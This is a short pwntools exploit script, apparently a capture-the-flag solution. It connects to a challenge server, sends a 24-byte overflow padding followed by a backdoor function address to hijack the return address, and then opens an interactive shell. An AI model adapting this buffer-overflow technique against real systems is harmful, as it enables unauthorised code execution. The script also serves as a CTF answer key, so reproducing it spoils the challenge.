from pwn import *
p = remote("pwn-2021.duc.tf", 31921)

backdoor = 0x4011DB
buf = b"A" * 24
buf += p64(backdoor)

print(p.recvuntil("song?"))
p.sendline(buf)

# W...w...Wait? Who put this backdoor out back here?
print(p.recvuntil("here?"))
p.interactive()